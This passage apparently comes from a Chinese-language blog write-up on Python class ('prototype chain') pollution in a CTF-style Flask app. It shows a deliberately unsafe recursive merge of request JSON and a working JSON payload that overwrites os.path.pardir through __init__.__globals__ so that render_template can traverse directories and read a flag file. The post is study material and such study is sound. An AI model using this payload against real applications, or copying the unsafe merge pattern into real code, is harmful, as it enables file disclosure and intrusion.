+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request,render_template</span><br><span class="line">import json</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&lt;path:path&gt;&quot;)</span><br><span class="line">def render_page(path):</span><br><span class="line">    if not os.path.exists(&quot;templates/&quot; + path):</span><br><span class="line">        return &quot;not found&quot;, 404</span><br><span class="line">    return render_template(path)</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>直接访问<code>http://domain/xxx</code>时会使用<code>render_tempaltes</code>渲染<code>templates/xxx</code>文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155140514.png"
+                      alt="image-20230714155140514"
+                ></p>
+<p>尝试目录穿越，则会报服务器错误</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155210221.png"
+                      alt="image-20230714155210221"
+                ></p>
+<p>根据报错信息找到源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155319790.png"
+                      alt="image-20230714155319790"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155307031.png"
+                      alt="image-20230714155307031"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155432773.png"
+                      alt="image-20230714155432773"
+                ></p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155515849.png"
+                      alt="image-20230714155515849"
+                ></p>
+<p>该函数接受一个名为<code>template</code>的字符串参数，表示模板路径。它首先通过<code>template.split(&quot;/&quot;)</code>将模板路径字符串分割成多个路径段，并使用<code>for</code>循环逐个处理这些段。</p>
+<p>在每个段中，函数进行以下检查：</p>
+<ul>
+<li><code>os.path.sep in piece</code> 检查路径段中是否包含正常路径分隔符（例如，在Windows上是<code>\</code>）。</li>
+<li><code>os.path.altsep and os.path.altsep in piece</code> 检查路径段中是否包含备用路径分隔符（例如，在Windows上是<code>/</code>）。</li>
+<li><code>piece == os.path.pardir</code> 检查路径段是否等于<code>os.path.pardir</code>，即上一级目录表示符号<code>..</code>。</li>
+</ul>
+<p>如果上述任何一个条件为真，就会引发<code>TemplateNotFound</code>错误，表示模板路径不合法。</p>
+<p>如果路径段不满足上述条件，且不为空或不等于当前目录表示符号<code>.</code>，则将其添加到<code>pieces</code>列表中。</p>
+<p>最后，函数返回由合法路径段组成的<code>pieces</code>列表</p>
+<p>那我们想要进行目录穿越就要避免触发34行的raise，os.path.pardir的值为..,所以我们只要修改为其他值就可以避免报错，从而实现render_template函数的目录穿越。</p>
+<p>paylaod:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;os&quot; : &#123;</span><br><span class="line">               &quot;path&quot;:&#123;</span><br><span class="line">                    &quot;pardir&quot; : &quot;#&quot; </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714160118834.png"
+                      alt="image-20230714160118834"
+                ></p>
+<p>污染进行目录穿越</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714160148486.png"
+                      alt="image-20230714160148486"
+                ></p>
+<p>本文到这里对python原型链污染的学习就结束了，再参考学习的文章中作者还写了再jinja中的应用，但是基本原理和前面差不多，只不过要对jinja的一些语法原理要有所了解，这里就没有进行复现。后期有机会了在去复现：<a class="link"   href="https://tttang.com/archive/1876/#toc_jinja_1" >https://tttang.com/archive/1876/#toc_jinja_1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>那么到这里对javascript和python的原型链污染的学习就结束了。</p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
 </search>
